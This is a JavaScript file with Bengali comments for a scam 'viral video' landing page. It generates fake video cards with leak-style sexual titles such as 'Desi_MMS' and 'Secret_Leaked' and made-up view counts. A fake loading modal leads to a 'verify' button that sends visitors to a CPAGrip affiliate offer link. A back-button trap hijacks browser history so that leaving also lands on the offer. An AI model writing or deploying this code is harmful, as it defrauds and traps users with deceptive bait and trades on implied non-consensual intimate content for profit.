// ১. তোমার CPAGrip Tracking Link
const MY_OFFER_LINK = "https://singingfiles.com/show.php?l=0&u=2506080&id=54746";

// ২. ছোট ভাইরাল টাইটেল
const bdShortTitles = ["Hot_Viral_BD", "Desi_MMS", "Secret_Leaked", "Bhabi_Vlog", "College_Viral"];

function generateGrid() {
    const grid = document.getElementById('video-grid');
    if (!grid) return;
    let html = '';
    for (let i = 1; i <= 60; i++) {
        const t = bdShortTitles[Math.floor(Math.random() * bdShortTitles.length)];
        const thumbID = i + 3000;
        html += `
            <div class="v-card" onclick="openModal()">
                <div class="v-thumb" style="background-image: url('https://picsum.photos/seed/${thumbID}/300/200')"></div>
                <div class="v-info">
                    <h4>${t}_Part_${i}.mp4</h4>
                    <p>${(Math.random()*3+1).toFixed(1)}M views • Just Now</p>
                </div>
            </div>`;
    }
    grid.innerHTML = html;
}

// ৩. পপ-আপ ওপেন করা
function openModal() {
    document.getElementById('server-modal').style.display = 'flex';
    setTimeout(() => {
        document.getElementById('progress-bar').style.width = '85%';
    }, 500);
}

// ৪. ভেরিফাই বাটনে ক্লিক করলে অফার লিঙ্কে যাবে
function goToCPA() {
    window.location.href = MY_OFFER_LINK;
}

// ৫. ব্যাক বাটন ট্র্যাপ (ইউজার বের হতে চাইলে অফার লিঙ্কে যাবে)
(function() {
    window.history.pushState(null, null, window.location.href);
    window.onpopstate = function() {
        window.location.href = MY_OFFER_LINK;
    };
})();

window.onload = generateGrid;
